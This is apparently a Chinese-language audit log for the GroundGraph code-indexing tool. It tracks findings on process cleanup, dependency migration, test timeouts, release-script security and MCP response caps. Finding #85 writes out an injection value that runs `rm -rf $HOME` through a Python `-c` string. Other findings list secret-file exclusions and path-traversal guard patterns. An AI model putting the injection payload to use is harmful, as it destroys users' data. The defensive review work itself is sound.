- **触发场景**：用户 Ctrl+C 后 `groundgraph index` 退出，但后台残留 2-3 个 dart_vm 进程；Dart sidecar 超时被 kill 后分析器子进程继续运行到自然结束，占用 SDK lock 让下一次 `groundgraph index` 起不来。
- **建议**：spawn 时 `cmd.process_group(0)`（Rust 1.64+ 稳定，非 unsafe）；kill 时发到整个进程组（unix 用 `killpg`，仍需 libc）。

### 69. `LspClient::Drop` 用 SIGKILL 强杀，不执行 LSP shutdown/exit handshake，sourcekit-lsp 留下损坏的锁文件

> **✅ 已闭环（2026-06-13 第十三轮）** — 成立（锁文件清理）。`LspClient::Drop` 不再直接 SIGKILL：先 `try_graceful_exit`（fire-and-forget 写 `shutdown` 请求帧 + `exit` 通知，**绝不等响应**以免 Drop 阻塞 I/O），`reap_within(300ms)` 给服务器释放 sourcekitd / index-store 锁的窗口，仍存活才 `kill_and_reap`（组杀 + 限时收割）。`force_kill` 与公有 `shutdown()` 的无限 `child.wait()` 一并换成限时收割（见 #77）。既有 `shutdown_after_forced_kill_is_a_clean_noop` 仍绿（child 已 take → 早返回）。

- **位置**：`crates/groundgraph-engine/src/lsp_client.rs:548-556`
- **问题**：（与第一批 #25 不同：#25 关注 `shutdown()` 函数内部 `force_kill` 后仍 `notify("exit")`；本条关注 `Drop` trait。）`Drop` 直接 `child.kill()` + `child.wait()`，没给服务器机会清理。`sourcekit-lsp` 在 macOS 上会持有 `~/Library/Caches/sourcekitd/sourcekitd-<hash>.lock` 和 `.build/index/store/.../values` 的读写锁；被 SIGKILL 后，**下一次 `groundgraph index` 在 8-12s 内无法启动 sourcekit-lsp**（直到 lock 过期或 OS 回收 fd）。更严重的路径：当 `lsp_indexer.rs:298-300` 的 `client.shutdown()` 失败后，`stats.skip_reason` 记一行警告，**`client` 走到 `Drop` 时直接 kill**。Windows 上 `Command::kill` 映射到 `TerminateProcess`，行为等同 SIGKILL（LSP 规范的 `shutdown` 请求被绕过）。
- **触发场景**：sourcekit-lsp 在 macOS 上的连续两次 index 之间。
- **建议**：`Drop` 内尽力做一次 200ms 超时的 `shutdown/exit` 通知；仅在子进程仍存活时才 `kill`。

### 70. `serde_yaml 0.9.34+deprecated` 已废弃不维护，应迁移到 `serde_yml`

> **✅ 已闭环（2026-06-15 第十七轮·发布前专项，TDD 回归）** — 迁移完成。全工作区 `serde_yaml 0.9.34+deprecated` → `serde_yml 0.0.13`（后端 `noyalib`，不再传递引入 `unsafe-libyaml`）：根 `Cargo.toml` 改 `serde_yml = "0.0.13"`、`groundgraph-engine`/`groundgraph-mcp` 走 `{ workspace = true }`；~30 个 `.rs`（src + tests）逐处 `serde_yaml::`→`serde_yml::`（同签名 drop-in）；`Cargo.lock` 重解析后 `serde_yaml`/`unsafe-libyaml` 条目彻底消失。`deny.toml` 注释同步。逐序列化点回归（`config_schema`/`check_doc_drift`/`checks_and_context` 等 YAML 往返用例）+ 全量门禁（`fmt`/`clippy -D warnings`/`test --workspace` 61 套件 0 失败）全绿。**#212（unsafe-libyaml）随本条一并闭环**。

- **位置**：`Cargo.toml:36`（`serde_yaml = "0.9"`）；`Cargo.lock:918-927`
- **问题**：`Cargo.lock` 锁定 `serde_yaml 0.9.34+deprecated`，crates.io 和官方仓库已明确标记为废弃（"This crate is deprecated in favor of serde_yml"）。废弃意味着不再接受安全补丁。GroundGraph 用它解析三个外部输入：`.groundgraph.yaml`、`.groundgraph/links.yaml`、AI 返回的 `candidates.yaml`——**后者是模型生成内容，是真正的外部输入面**。`serde_yaml 0.9` 还间接拉入 `unsafe-libyaml`（`Cargo.lock:1335`），虽然目前未公开 CVE，但废弃生态的安全修复路径已断。
- **触发场景**：未来 `unsafe-libyaml` 披露漏洞时 GroundGraph 拿不到补丁；AI 生成 YAML 含恶意构造（如 billion-laughs 实体扩展）时无防护。
- **建议**：全工作区把 `serde_yaml = "0.9"` 换成 `serde_yml = "0.0.12"`（API 几乎兼容，`from_str`/`to_string` 签名一致），逐 crate 迁移。

### Medium（7 个）

### 72. `.groundgraph.yaml` 无 `schema_version` 字段，未来字段重命名/语义变更无前置告警

> **✅ 已闭环（2026-06-13 第十四轮·Wave E）** — 成立（TDD）。`EngineConfig` 加 `#[serde(default, skip_serializing_if="Option::is_none")] pub schema_version: Option<u32>`（首字段），定义 `pub const CONFIG_SCHEMA_VERSION: u32 = 1`。新增纯函数 `config_schema_notice(declared, supported)` + 方法 `EngineConfig::schema_version_notice()`：仅当 `declared > supported` 时返回前置告警（对齐 DB 的 `SchemaTooNew` #153），`None`（旧文件无字段）与 `<=` 一律静默。`index.rs`/`slice.rs` 两处 `load_config` 解析后经既有 `eprintln!("groundgraph: …")` 通道发告警（非致命）。`init` 的 `default_config_for` 统一在出口给 Dart/多语言两分支都打上 `schema_version: Some(1)`。`skip_serializing_if` 使旧/最小配置仍干净。TDD：`config_schema_notice_warns_only_on_newer_than_supported`（None/=/</> 边界 + 含字段名）、`legacy_config_without_schema_version_loads_and_is_silent`、`init_stamps_config_schema_version`（Dart + 多语言两分支都断言 `Some(1)`）。config_schema 22 测试全绿。

- **位置**：`crates/groundgraph-engine/src/config.rs:18-113`（`EngineConfig` 定义）
- **问题**：项目所有外部契约 schema 都有版本号：`EVIDENCE_SCHEMA_VERSION`、`CANDIDATES_SCHEMA_VERSION`、`QUESTIONS_SCHEMA_VERSION`、`TEST_SUGGESTIONS_SCHEMA_VERSION`、`CONSTANTS_SCHEMA_VERSION`，数据库也有 `schema_version` 表。**但 `.groundgraph.yaml` 本身没有版本字段**。当下一个 release 把 `code.paths` 改名 / 把 `enrichment.lsp` 语义改变 / 把 `checks.broken_link_level` 取值扩展时，老仓库的 YAML 会被静默解释成新语义（`#[serde(default)]` + `deny_unknown_fields` 已删除 = 完全没有版本守门）。`config.rs` 注释明确说"放弃 `deny_unknown_fields` 以便兼容未来键"，但没有配套版本号就无法做"老版本→迁移提示"路径。
- **建议**：加 `#[serde(default)] pub schema_version: Option<u32>`，定义 `const CONFIG_SCHEMA_VERSION: u32 = 1`，`init` 写默认配置时填入；加载时若 `Some(v)` 且 `v > CONFIG_SCHEMA_VERSION` 给出 `warning: config was written by groundgraph v{v}, this build supports v1`。

### 74. evidence 表无外键约束到 nodes，`upsert_evidence` 接受任意 `artifact_id`（即使节点不存在）

> **🟡 按设计（2026-06-13 第十三轮，实证）** — 不采纳 FK。两点证据：(1) `upsert_evidence` **生产侧无调用者**（仅 `tests/repositories.rs`），孤儿 evidence 实际不产生；(2) 更根本，GroundGraph 图是**多 indexer 最终一致 + 事后 orphan-sweep** 模型：`clear_indexer_outputs` 先按 indexer 删 nodes/edges，再 `DELETE FROM evidence/symbol_ranges/node_fts WHERE ... NOT IN (SELECT id FROM nodes)` 事后清扫——边**故意不清**，跨 indexer 的边可合法指向被另一 indexer 删除的节点。FK `ON DELETE CASCADE` + `foreign_keys=ON` 会改变这套两阶段语义并按 insert 顺序拒绝合法写入。孤儿是被设计接受、由 sweep GC 的状态，不是约束违例。建议(b)「写入时 `find_node` 校验」对真实图（边/证据先于目标节点写入）会误拒，亦不采纳。

- **位置**：`crates/groundgraph-store/src/migrations_sql/001_initial.sql:38-48`（evidence 表 DDL 无 `FOREIGN KEY`）；`crates/groundgraph-store/src/repositories.rs:292-310`
- **问题**：evidence 表的 `artifact_id TEXT NOT NULL` 没有 `REFERENCES nodes(id)` 外键，也没有应用层校验。`upsert_evidence` 接受任意字符串——`artifact_id = "nonexistent::xxx"` 也能成功写入，留下永远无法被消费的孤儿 evidence 行。`clear_indexer_outputs` 的 `DELETE FROM evidence WHERE artifact_id NOT IN (SELECT id FROM nodes)` 是事后清理，不是写入时约束——孤儿行在两次 index 之间一直存在，膨胀 DB 体积。
- **建议**：(a) DDL 改为 `artifact_id TEXT NOT NULL REFERENCES nodes(id) ON DELETE CASCADE` + 启用 `PRAGMA foreign_keys=ON`；(b) 或在 `upsert_evidence` 中先 `find_node` 校验存在。

### 75. SCIP overlay 的 `overlay_edges` dedup 用 `(&str, &str, EdgeKind)` HashSet，丢失同 pair 的多调用点证据

> **✅ 已闭环（2026-06-13 第十四轮·Wave C，TDD 修复）** — 成立。`overlay_edges` 改为返回 `Vec<OverlayEdge>`：每个 `(from, to, kind)` 三元组聚合**全部**调用点 line（升序去重），`edge.line` 取最小值保持向后兼容；`ingest_scip_overlay` 把整组 line 写入 `evidence_json.lines: [..]`（同时保留 `line` 字段给旧读者，`graph.rs::parse_reference_evidence` 仍可用）。dedup 不再丢证据——采用建议（b）数组方案而非 per-line 拆边，避免边数膨胀。新增单测 `repeated_call_sites_aggregate_every_line`（同 pair 命中 line 21/25/21 → 聚合 `[21,25]`、`edge.line==21`、`evidence_json.lines==[21,25]`，修复前因 HashSet 只留首个 line 而 RED）；既有 8 个 scip_overlay 单测全绿。

- **位置**：`crates/groundgraph-engine/src/scip_overlay.rs:91-130`
- **问题**：`seen.insert((from.symbol_id.as_str(), to.symbol_id.as_str(), kind))` 在第一次见到 `(A, B, Calls)` 时 insert 成功，后续 99 次相同 pair 跳过。但 evidence_json 是基于第一次见到的 `line` 构造的，后续 99 个调用点（不同 line）的证据丢失。UI 显示"调用证据：line 12"，实际调用还出现在 line 45、line 78、line 102。对 dead_code 分析、impact 分析、点击跳转都有影响——用户只看到一个调用点。
- **触发场景**：方法 A 在方法 B 中被调用多次（循环内、多个分支）。
- **建议**：要么 dedup key 加入 line（`(from, to, kind, line)`），让每个调用点都生成一条边；要么把所有调用 line 收集到 evidence_json 的 `lines: [12, 45, 78, 102]` 数组中。

### 77. `scip_runner::run_with_capped_stderr` 主线程 busy-read stderr 无超时；`LspClient::Drop` 的 `child.wait()` 无超时且 reader 线程 detached

> **✅ 已闭环（2026-06-13 第十三轮，TDD）** — 两处均成立。(1) **scip_runner**：`run_with_capped_stderr` 重写为 reader 线程排空 stderr（capped）+ 主线程 `try_wait` 轮询 + wall-clock 预算（`GROUNDGRAPH_SCIP_TIMEOUT_SECS`，默认 600s——只防"挂死"不误杀慢 indexer），超时 `kill_and_reap` 组杀并返回 `ErrorKind::TimedOut`（`execute` 映射为"`<prog>` 超时被终止…结构图不受影响"的 Failed，而非误报"无法启动"）。(2) **lsp_client**：`force_kill` / `Drop` / `shutdown()` 的裸 `child.wait()` 全部换成 `reap_within` 限时收割，`kill` 失败也不再永久阻塞；reader 线程仍随 stdout EOF 退出（组杀确保子进程死 → stdout 关 → EOF）。TDD：`run_with_capped_stderr_budget_kills_a_hung_indexer`（`sleep 30` + 300ms 预算 → 立即 `TimedOut`）、`parse_scip_timeout_defaults_and_honours_positive_overrides`、`proc::reap_within_*`。

- **位置**：`crates/groundgraph-engine/src/scip_runner.rs:612-643`（`run_with_capped_stderr`）、`crates/groundgraph-engine/src/lsp_client.rs:537-556`（`Drop`）
- **问题**：两个独立但同类的子进程超时缺陷：
  1. **scip_runner**：`cmd.stdin(Stdio::null()).stdout(Stdio::null()).stderr(Stdio::piped())` 后，主线程同步循环 `stderr.read(&mut chunk)` 直到 EOF，**纯 busy 阻塞**——一个长时间运行的 indexer（rust-analyzer 冷启动 30s+）期间主线程完全 parked 在 read 上，没有超时机制。`run_indexers` 是串行的（`for plan in plans`），一个挂起的 indexer（gopls 卡在网络盘）会无限挂起整个 `groundgraph index`。`dart_sidecar` 修过这个问题（第二批 #48 加了 wall-clock 预算 + try_wait 轮询），但 `scip_runner` 没修。
  2. **lsp_client Drop**：`force_kill` 与 `Drop` 都执行 `child.kill(); child.wait()`，但 `wait()` 没有超时——如果 `child.kill()` 因权限不足失败（LSP server 是 root 跑的），`wait()` 会阻塞。同时 reader 线程是 detached 的，没有保存 `JoinHandle`——异常路径下 reader 阻塞在 `read_line` 内不会到达 `tx.send`，永远不会退出，每次 LSP 索引失败都泄漏一份线程 + fd，CI 累积下来会撞 fd 上限。
- **触发场景**：rust-analyzer/gopls 在网络盘挂起；权限不对称的 LSP 子进程。
- **建议**：scip_runner 引入 reader thread + 主线程 `try_wait` + 全局预算（如 30 分钟），与 `dart_sidecar` 一致；lsp_client Drop 用 `wait_timeout`（或 `try_wait` 轮询 1-2s）超时则放弃 join 但记 warn。

### 78. 多处 `run_git` 不检查退出码

> **✅ 已闭环（2026-06-13 第十三轮）** — 成立（测试基建）。`end_to_end_paths.rs` 的 `run_git` helper 加 `assert!(status.success(), "git {args:?} failed with {status}")`；`config_schema.rs` 新增同款 checked `run_git` helper，把 `run_impact_honours_configured_doc_and_warning_levels` 内 6 处内联 `Command::new("git")...status().unwrap()` 全部替换。git 因 `index.lock`/hook/detached HEAD 返回非零时立即在调用点失败，不再带病前进到误导性断言。验证：两二进制 `end_to_end_paths`(19)/`config_schema`(14) 全绿。

- **位置**：`crates/groundgraph-engine/tests/end_to_end_paths.rs:39-46`、`crates/groundgraph-engine/tests/config_schema.rs:318-361`（共 8 处 git 调用）
- **问题**：**run_git**：`end_to_end_paths.rs:39-46` 和 `config_schema.rs:318-361` 共 8 处 `run_git(...).status().unwrap()` 只检查 spawn 成功，不 `assert!(status.success())`。对照 `cli/tests/impact.rs:32-40` 的正确写法。git 因 `.git/index.lock` 残留、pre-commit hook 失败、detached HEAD 等返回非零退出码时，后续测试读出错误结果或 panic 在意想不到的位置。
- **建议**：把这 8 处 `run_git` 统一替换为带 `assert!(status.success())` 的 helper。

### 79. `p21_rust_self_host` 无超时且断言脆弱；`#[ignore]` 的 swift build 同样无超时

> **✅ 已闭环（2026-06-13 第十三轮）** — 两处均成立。(1) **p21**：`index_rust` 移到 worker 线程 + `recv_timeout(180s)` wall-clock 预算（`Store` 访问全留在 worker，仅 `Send` 的 result+nodes 过 channel），超时 panic 明确报"疑似 parser/store hang"，CI 快速失败而非跑到 6h 上限；删去脆弱的私有符号断言 `has(RustFunction,"scan")`（改名即误红），保留导出 API 锚点（`index_rust` / `LangSpec` / `RustIndexResult` 证明解析了真实当前源）+ 既有 count 阈值。(2) **swift build**：新增测试本地 `run_with_timeout`，`swift build` 限 120s，超时 soft-skip（当作 build 失败 → 仅丢弃 Calls overlay 断言，结构断言照跑），冷 SwiftPM 缓存/受限 registry 不再挂死 `--include-ignored`。验证：p21 0.53s 通过；lsp_indexers 非 ignore 用例 5 绿。

- **位置**：`crates/groundgraph-engine/tests/p21_rust_self_host.rs:25-96`；`crates/groundgraph-engine/tests/lsp_indexers.rs:139-146`
- **问题**：两个测试超时缺陷：
  1. **p21_rust_self_host**：`index_rust(&mut store, ...)` 索引整个 GroundGraph workspace（约 150+ 个 .rs 文件、>30000 行），**没有 wall-clock 上限**。tree-sitter 解析器或 SQLite 写入卡住时，CI 会无限等待直到被外部 killer 杀掉（GitHub Actions 默认 6 小时）。同时测试断言 `has(NodeKind::RustFunction, "scan")` 等具体符号名——重构把 `scan` 重命名为 `scan_rust` 会让测试失败，但失败信息和"自托管回归"无关，只是符号改名。
  2. **lsp_indexers swift build**：`#[ignore]` 测试 `swift_indexer_emits_class_struct_protocol_method_nodes_when_lsp_present` 在 fixture 上跑 `swift build`，没有超时。SwiftPM 解析依赖（首次拉取 swiftpm、cache miss）在冷启动 CI 上可能耗时 5+ 分钟；网络受限环境下甚至挂死等待 registry。虽然 `#[ignore]` 默认不跑，但 `--include-ignored` 时仍可能卡住 nightly CI。
- **建议**：p21 包一层超时（`std::thread::spawn` + `recv_timeout`，或用 `timeout` crate），断言改为更具语义的指标（`count(NodeKind::RustFunction) >= 50`）；swift build 用 `wait_timeout` + 120s 预算，超时 soft-skip。

### 80. `validate_macos_package.sh` tar 未防御路径穿越；`.sha256` 文件含绝对路径；release 二进制未 strip

> **✅ 已闭环（2026-06-13 第十一轮）** — 三处全修 + 真实命令验证：(1) `validate_macos_package.sh` 解压前用 `tar -tzf | grep -E '^/|(^|/)\.\.(/|$)'` 拒绝绝对/`..` 成员，并加"恰好一个顶层目录"守卫（真实构造 `../f` 归档 → exit 1；双顶层 → exit 1）；(2) `.sha256` 改在 `$DIST_DIR` 内对 basename 执行 `shasum`，下载方 `shasum -c` 可用；(3) 根 `Cargo.toml` 加 `[profile.release] strip = "debuginfo"`（去 DWARF + 构建机绝对路径，保留符号表供 backtrace）。

- **位置**：`scripts/validate_macos_package.sh:13-14`；`scripts/release_macos_universal.sh:141`、产物 `dist/groundgraph-0.2.0-macos-universal.tar.gz.sha256`；`scripts/release_macos_universal.sh:74-78`
- **问题**：三个独立的 release 链缺陷：
  1. **tar 路径穿越**：`tar -xzf "$ARCHIVE" -C "$TMP"` 未防御符号链接/`..` 路径；`find ... | head -n 1` 在多顶层包时静默取错目录。macOS bsdtar 对含 `..` 的成员会 warn 但仍写。上游分发链被篡改可写出到 `$TMP` 之外。
  2. **`.sha256` 绝对路径**：`shasum -a 256 "$ARCHIVE"` 把 `$ARCHIVE` 的**绝对路径**写进 `.sha256` 文件。当前提交的 `dist/groundgraph-0.2.0-macos-universal.tar.gz.sha256` 内容是 `/Users/qjs/Code/Projects/groundgraph/dist/...`。下载用户在任意目录跑 `sha256sum -c` 时必然报 `No such file or directory`。
  3. **二进制未 strip**：`cargo build --release` 默认在 macOS 产出含 DWARF 调试信息的二进制（产物 15 MB），`lipo -create` 后无 `strip -x`。泄漏构建机绝对路径（违反企业安全策略），无谓大 5-8 MB，崩溃 dump 暴露内部符号布局。
- **建议**：(a) 解压前 `tar -tzf "$ARCHIVE" | grep -E '(^\./?\.\.|[^/]/\.\./)' && exit 1`；(b) release 脚本切到 `$DIST_DIR` 后再 `shasum`，让输出只含 basename；(c) `lipo -create` 后加 `strip -x`，或 Cargo.toml 加 `[profile.release] strip = "debuginfo"`。


## 第四批扩展（#81–#130，2026-06-13 第四轮）

**第四轮背景**：第三批结束后用户继续要求"找新的 50 个"。本轮从前三批**未深查的 5 个角度**重新发起并行审查：webui/dist/packaging（非 Rust 资产）、MCP 工具完整性、CLI 端到端工作流、引擎深层算法（route_coverage/dead_code/port_coverage/graph_equiv 等）、tree-sitter 多语言 adapter。5 个 agent 共返回 70 个候选，去重后挑选 50 个新发现追加如下。编号从 81 开始。

### High（12 个）

### 81. `release_scan.sh` rsync 把第三方仓库的 `.env`（含 `OPENAI_API_KEY`、`API_TOKEN`）同步进开发机工作目录

> **✅ 已闭环（2026-06-13 第十一轮）** — 成立（已确认 scratch 实际含真实密钥）。四语言 rsync 统一前置 `SECRET_EXCLUDES`（`.env`/`.env.*`/`*.pem`/`*.key`/`*.p12`/`*.pfx`/`*.keystore`/`secrets.*`/`credentials*`/`.aws/`/`.ssh/`/`.netrc`/`.npmrc`/`.pypirc`），并在 rsync 后兜底 `find … -delete` 清扫漏网密钥。真实脚本验证：含 `.env`/`.envs/.env.prod`/`*.pem`/`*.key`/`*.keystore` 的目标仓 → scratch 副本零密钥泄漏，`lib/app.dart`/`README.md` 保留。

- **位置**：`scripts/release_scan.sh:37-99`（rsync exclude 列表）；产物 `release-scans/_scratch/atagent/.envs/.env.prod`、`release-scans/_scratch/atagent/frontend/.env`、`release-scans/_scratch/pixcraft-landing/.env.local`
- **问题**：四个语言的 rsync exclude 列表都未包含 `.env*`、`*.pem`、`*.key`、`secrets.*`、`.aws/`、`.ssh/`、`.netrc`、`credentials*`。已确认 scratch 目录里**实际存在**至少 3 个非 `.example` 的真实密钥文件，其中 `atagent/.envs/.env.prod` 文件头明确写着"此文件包含敏感信息，请勿提交到Git"，含 `OPENAI_API_KEY=`、`API_TOKEN=` 字段。GroundGraph 是"非侵入式扫描"，但 rsync 把目标仓的源码完整复制到本地工作目录后，开发者机器**实际持有第三方生产密钥明文**。
- **触发场景**：任何开发者按 README 跑 `scripts/release_scan.sh atagent /path/to/atagent python`，下次做 `tar -czf groundgraph-backup.tar.gz .`（备份、迁移、给同事传仓库快照）就会带上这些密钥。
- **建议**：rsync exclude 列表头部统一加入 `--exclude '.env' --exclude '.env.*' --exclude '*.env' --exclude '**/.env' --exclude '**/.env.*' --exclude '*.pem' --exclude '*.key' --exclude 'secrets.*' --exclude 'credentials*' --exclude '.aws/' --exclude '.ssh/'`；脚本顶部兜底 `find "$SCRATCH" -name '.env*' -not -name '*.example' -delete`。

### 82. macOS 发布二进制仅 ad-hoc 签名、无 Developer ID 签名/公证/entitlements/Info.plist，`spctl` 直接 reject

> **🟢 脚本框架就位·待证书（2026-06-15 第十七轮）** — `scripts/release_macos_universal.sh` 在 `lipo` 后增加可选 `codesign`（Developer ID Application + `--options runtime` + `--timestamp`）→ `notarytool submit --wait`（zip 提交公证）→ `spctl --assess` 验证 三段流水线，由 `GROUNDGRAPH_SIGN_IDENTITY` + `GROUNDGRAPH_NOTARY_PROFILE` 两个环境变量门控：未设时跳过并打印明确告警（保持 ad-hoc、不静默发布未签名包），设了即走完整签名+公证+staple。**仓内无法自验**（依赖用户 Apple Developer ID 证书 / keychain notary profile）——框架已就位，发布者填证书即可消除 Gatekeeper 拦截。**降级为"待证书"，非代码阻断**。原 ad-hoc 现状（下方）保留供参考。

- **位置**：`scripts/release_macos_universal.sh:71-78`（lipo 后无 codesign 步骤）；`packaging/`（仅 4 个 README 文件，**无 Info.plist、无 entitlements、无 codesign 配置**）；产物 `dist/groundgraph-0.2.0-macos-universal/libexec/groundgraph`
- **问题**：用 `codesign -dvvv` 验证发布产物：`Signature=adhoc`、`TeamIdentifier=not set`；`spctl --assess --type execute -vv` 输出 **`rejected: source=no usable signature`**。与 #80 的"未 strip"是**不同维度**——strip 是去调试符号，签名是 Gatekeeper 准入。`packaging/macos/README.md` 给用户的安装指令是 `tar -xzf ... && sudo cp -R ... /usr/local/groundgraph`，**完全没提"在 Finder 双击会弹'无法验证开发者'"**。终端运行 `groundgraph --help` 在 macOS Sequoia 默认策略下首次会被 Gatekeeper 拦截。
- **触发场景**：终端用户从 GitHub Release 下载 tar.gz、解压、运行——除非走 `sudo cp` 到 `/usr/local`（root 上下文不触发 Gatekeeper），否则首次执行会被拦。
- **建议**：(a) `lipo -create` 后追加 `codesign --force --options runtime --timestamp --entitlements packaging/macos/groundgraph.entitlements -s "Developer ID Application: <Name>"`；(b) 然后 `xcrun notarytool submit ... --wait` + `xcrun stapler staple`；(c) 在 `packaging/macos/` 下加 `Info.plist`；(d) README 增加 `xattr -dr com.apple.quarantine` 解除说明。

### 83. `release_scan.sh` 的 `NAME`/`SRC` 参数无 sanitize，rsync `--delete` 配合路径穿越可清空 groundgraph 仓库任意目录

> **✅ 已闭环（2026-06-13 第十一轮）** — 成立（rsync `--delete` 目标可被 NAME 穿越清空）。解析 NAME/SRC 后立即守卫：NAME 必须是纯 slug（拒空、`.`、`..`、含 `/`、含 `..` 子串、前导 `.`、`[A-Za-z0-9._-]` 之外字符），SRC 必须为已存在目录，全部在 mkdir/rsync 之前 `exit 2`。真实验证：`../../crates`/`a..b`/`a/b`/`.hidden`/`a b` → exit 2，合法 NAME 越过守卫。

- **位置**：`scripts/release_scan.sh:21-22, 27-30`
- **问题**：`NAME="${1:?need name}"`、`SRC="${2:?need src path}"` 直接拼到 `SCRATCH="$SCRATCH_BASE/$NAME"`、`REPORT="$REPORTS_BASE/$NAME"`。若调用方传 `NAME="../../crates"` 或 `NAME="../../"`（误打字、shell 自动补全出错、CI 模板渲染失误），`SCRATCH` 解析为 `$ROOT/crates`，随后 `rsync -a --delete "$SRC"/ "$SCRATCH"/` 会**删除 groundgraph 自己的 crates 目录里所有不在 $SRC 中的文件**。`SRC` 参数同理：传 `SRC="../../"` 会让 rsync 把整个上级目录同步进来。
- **触发场景**：CI 调用脚本时变量未引号；开发者补全路径误填；自动化模板 `NAME="${USER_INPUT}"`。
- **建议**：(a) 解析后加守卫 `case "$NAME" in *../*|..|/*|*//*) echo "invalid NAME: $NAME" >&2; exit 2;; esac`；(b) 强制 `NAME` 仅匹配 `[A-Za-z0-9_-]+`；(c) 用 `realpath --relative-to="$SCRATCH_BASE"` 校验结果未越界。

### 85. `release_scan.sh` 用 shell 字符串插值构造 `python3 -c "..."`，`$REPORT` 路径含单引号或恶意字符时可触发 Python 代码注入

> **✅ 已闭环（2026-06-13 第十一轮）** — 成立。`python3 -c` 改为**单引号源码 + argv 传参**（`count_json_array` 把路径与数组键作为 `sys.argv[1/2]`），路径再不插值进 Python 源。真实验证：报告目录名含单引号时新写法仍正确输出计数（nodes=3/edges=1），旧插值写法在同路径下抛 `SyntaxError`（证明漏洞曾存在且已闭）。同一改动同时闭合 #185（双引号串内 shell 求值维度）。

- **位置**：`scripts/release_scan.sh:136-137`
- **问题**：`NODE_COUNT=$(python3 -c "import json,sys; d=json.load(open('$REPORT/graph-code.json')); ...")`——把 shell 变量 `$REPORT` 字符串插值进 Python 源代码字符串中。Python 单引号字符串里若出现单引号会闭合字符串，后续内容被解释为 Python 代码。攻击向量在 `NAME`：传 `NAME="x';import os;os.system('rm -rf $HOME');'"` 时，构造出的 Python 代码变成 `open('$ROOT/reports/release/x';import os;os.system('rm -rf $HOME');'/graph-code.json')`，`import os; os.system(...)` 被执行。
- **触发场景**：CI 模板渲染 `NAME` 时未 escape；恶意 PR 修改 workflow 调用参数；开发者本地误传含特殊字符的 NAME。
- **建议**：把 `$REPORT` 通过环境变量传给 Python：`REPORT="$REPORT" python3 -c "import json,os; p=os.environ['REPORT']+'/graph-code.json'; ..."`；或改用 `jq` 工具。

### 86. MCP `tools/list` 缺分页/`cursor` 参数；超量工具集会破坏 MCP 协议契约

> **✅ 已闭环（2026-06-13 第十轮）** — 成立（前瞻健壮）。`tools/list` 现支持 MCP 规范的 `cursor`/`nextCursor` 分页：新增纯函数 `paginate_tools` + `TOOLS_PAGE_SIZE=100`，非字符串 cursor 与越界/不可解析 cursor 返回 `-32602`，单页时省略 `nextCursor`（7 个工具行为完全不变、向后兼容）。**拒绝"描述 > 1024 截断"子建议**：截断会损坏 agent 依赖的工具描述与 inputSchema，分页才是正确的体积边界手段。TDD：`tools_list_pagination_walks_every_tool_in_order`（page_size=2 走遍全部工具、顺序/不重不漏）+ `tools_list_rejects_bad_cursor_and_single_page_has_no_next`。

- **位置**：`crates/groundgraph-mcp/src/server.rs:144-157`、`crates/groundgraph-mcp/src/tools/mod.rs:33-43`
- **问题**：MCP 规范（2024-11-05 及后续）规定 `tools/list` 接受 `cursor` 参数并返回 `nextCursor` 字段，server 在工具数量超过合理上限时必须分页。当前实现：(1) 完全忽略 `params` 中的 `cursor` 字段；(2) 一次序列化全部 `descriptors()`，没有 `nextCursor` 字段；(3) 一旦未来 GroundGraph 引入动态/语言特定工具集（README 提到的 `candidate_*` 计划），单条 JSON-RPC 响应可能膨胀到几 MB；某些 MCP 客户端（VS Code MCP adapter、Cursor）对 tools/list 响应有硬上限（典型 256 KB），超限会被静默截断或拒绝渲染工具面板。
- **建议**：在 `tools_list_result` 解析 `params.cursor`，按 N 个一批分页（默认 N=100），在结果中携带 `nextCursor`；同时增加单工具 descriptor 大小上限（描述 > 1024 字符截断 + `…`）。

### 87. `explain_symbol` 无任何大小上限：hub 节点响应可达 MB 级、撕裂 MCP 帧

> **✅ 已闭环（2026-06-13 第十轮）** — 成立。引入 `MAX_EXPLAIN_EDGES=500`（上游+下游合计），先取上游入边（含 `declares_verification` 测试边）再按剩余预算取下游，截断时顶层加 `truncated: true` 与 `truncation_hint`（提示用 `get_subgraph` 钻取），`stats.total_edges` 暴露真实规模。TDD：`explain_caps_edges_keeps_tests_and_flags_truncation`（高扇出 hub 被截断且测试边仍保留）。

- **位置**：`crates/groundgraph-mcp/src/tools/explain_symbol.rs:61-104`
- **问题**：对 `list_edges_from(&aid)` 和 `list_edges_to(&aid)` 做无界 `for` 循环，每条边再调 `store.find_node` 拼一个完整 JSON 对象。**没有任何 `truncated` 标记、没有节点/边上限、没有 hub 节点检测**。当 symbol 是高扇出 hub（如 Kotlin/Java 的 `Object.equals`、`toString`，或 Spring 的 `ApplicationContext`），上游+下游边可达 5 位数；`tools/call` 返回单个 `text` block，pretty-printed JSON 文本膨胀到几 MB，部分 MCP 客户端（Claude Desktop 已知单 content block < 100 KB 软限制）会丢弃响应或截断后呈现错误结果。
- **与第一批 #9 的区别**：#9 已修 `get_subgraph`（加 `MAX_SUBGRAPH_NODES/EDGES` + `truncated`），但 `explain_symbol` 从未被修复，是同一缺陷在新 tool 上的复现。
- **建议**：引入 `MAX_EXPLAIN_EDGES: usize = 500`（上游+下游合计），截断时在响应顶层加 `"truncated": true` 与 `"truncation_hint"`，提示 agent 用 `get_subgraph` 继续 drill-down。

### 88. `context_pack` 无大小上限 + 每邻居 `find_node` 独立查询：N×查询 + MB 级响应

> **✅ 已闭环（2026-06-13 第十轮）** — 主体成立并修复。`read_snippet` 加 `SNIPPET_MAX_FILE_BYTES=2MB` 元数据门（超限直接返回 `None`，杜绝把生成大文件整体读入内存的 OOM）；`build_symbol_pack` 加 `MAX_PACK_NEIGHBORS=300` 邻居上限（优先上游入边），hub 时返回 `truncated`。TDD：`read_snippet_skips_oversized_files_but_reads_small_ones` + `symbol_pack_caps_neighbours_and_flags_truncation`。**N+1 查询**：上限落地后单次调用的 `find_node` 次数已被严格有界（≤300），不再有"上千次往返"风险；批量化（一次 `IN (...)`）作为纯性能优化留作存储层专项，不在本轮散修。

- **位置**：`crates/groundgraph-mcp/src/tools/context_pack.rs:115-247`（candidate & symbol 模式）、`273-299`（`read_snippet`）
